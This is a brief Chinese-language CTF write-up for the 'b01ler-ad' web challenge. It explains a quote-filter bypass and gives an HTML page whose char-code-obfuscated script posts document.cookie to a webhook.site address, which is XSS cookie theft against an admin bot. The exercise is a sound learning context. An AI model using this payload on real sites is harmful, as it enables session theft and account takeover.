# web
### b01ler-ad
post `/review`接口,会有一个浏览器来访问http://localhost:3000/admin/view?content?=${content}
,发送一个html文档,

过滤了' " \` 使用String.fromCharCode绕过
 应该是xss读cookie,就是直接发个html,fetch,注意加个no-cors,不然无法跨域

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>upload</title>
</head>
<body>
<script>
eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,97,50,48,99,57,102,57,100,45,98,53,48,54,45,52,97,56,97,45,57,51,100,97,45,99,101,53,52,102,100,56,55,100,48,54,97,39,44,123,109,101,116,104,111,100,58,39,80,79,83,84,39,44,109,111,100,101,58,39,110,111,45,99,111,114,115,39,44,98,111,100,121,58,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,125,41))</script>

</body>
</html>
```
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413232240.png)

### imagehost



# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-04-13   22:21